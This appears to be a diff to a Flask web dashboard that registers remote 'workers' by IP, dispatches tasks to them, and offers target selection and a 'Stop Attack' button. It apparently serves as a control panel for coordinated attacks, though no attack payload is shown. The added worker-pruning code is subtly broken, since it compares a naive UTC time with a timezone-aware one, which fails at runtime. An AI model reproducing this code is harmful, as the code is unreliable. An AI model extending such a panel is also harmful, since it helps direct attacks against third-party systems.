@@ -1,10 +1,10 @@
 import json
 import os
-from datetime import datetime
+from datetime import datetime, timedelta
 from flask import Flask, request, jsonify, render_template_string
 
 # ----------------------------------------------------------------------
-# Data directory – persistent for the run
+# Configuration
 # ----------------------------------------------------------------------
 DATA_DIR = os.environ.get('WEBAPP_DATA', 'webapp_data')
 os.makedirs(DATA_DIR, exist_ok=True)
@@ -14,6 +14,8 @@ os.makedirs(TASKS_DIR, exist_ok=True)
 
 RESULTS_FILE = os.path.join(DATA_DIR, 'results.json')
 WORKERS_FILE = os.path.join(DATA_DIR, 'workers.json')
+
+OFFLINE_TIMEOUT_MINUTES = 10   # workers older than this are removed
 
 # Ensure files exist
 for f in [RESULTS_FILE, WORKERS_FILE]:
@@ -38,7 +40,7 @@ def ensure_worker_tasks_file(worker_ip):
     return path
 
 # ----------------------------------------------------------------------
-# HTML Template (with Stop Attack button and working clear telemetry)
+# HTML Template (with all features)
 # ----------------------------------------------------------------------
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -499,8 +501,6 @@ HTML_TEMPLATE = '''
             document.getElementById('currentTargetIndicator').innerText = selectedTarget === 'all' ? 'all nodes' : selectedTarget;
         };
         // Call it after any target change
-        const origCardClick = document.querySelectorAll('.worker-card').forEach(c => c.onclick);
-        // Override reset target to also update indicator
         const resetBtn = document.getElementById('resetTarget');
         const originalResetHandler = resetBtn.onclick;
         resetBtn.onclick = () => {
@@ -509,10 +509,6 @@ HTML_TEMPLATE = '''
             updateTargetIndicator();
             updateData();
         };
-        // Update indicator after card click (already set inside card click, but we need to call updateTargetIndicator there)
-        // We'll add a global function to update after any selection.
-        // Already calling updateTargetIndicator inside card click and reset; we just need to make sure it's called.
-        // Add a setter for selectedTarget? Not needed.
         window.updateTargetIndicator = updateTargetIndicator;
         updateTargetIndicator();
     </script>
@@ -522,13 +518,13 @@ HTML_TEMPLATE = '''
 
 app = Flask(__name__)
 
+# ----------------------------------------------------------------------
+# API endpoints
+# ----------------------------------------------------------------------
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
 
-# ----------------------------------------------------------------------
-# API endpoints
-# ----------------------------------------------------------------------
 @app.route('/api/tasks', methods=['GET'])
 def get_tasks():
     all_tasks =[]
@@ -645,7 +641,30 @@ def register_worker():
 @app.route('/api/workers', methods=['GET'])
 def get_workers():
     with open(WORKERS_FILE, 'r') as f:
-        return jsonify(json.load(f))
+        workers = json.load(f)
+    
+    now = datetime.utcnow()
+    cutoff = now - timedelta(minutes=OFFLINE_TIMEOUT_MINUTES)
+    active_workers = []
+    for w in workers:
+        last_seen_str = w.get('lastSeen', '')
+        if not last_seen_str:
+            continue
+        if not last_seen_str.endswith('Z'):
+            last_seen_str += 'Z'
+        try:
+            last_seen = datetime.fromisoformat(last_seen_str.replace('Z', '+00:00'))
+        except Exception:
+            continue
+        if last_seen >= cutoff:
+            active_workers.append(w)
+    
+    # Prune the file if we removed any workers
+    if len(active_workers) != len(workers):
+        with open(WORKERS_FILE, 'w') as f:
+            json.dump(active_workers, f, indent=2)
+    
+    return jsonify(active_workers)
 
 if __name__ == '__main__':
     print("Dashboard started on http://127.0.0.1:5000")
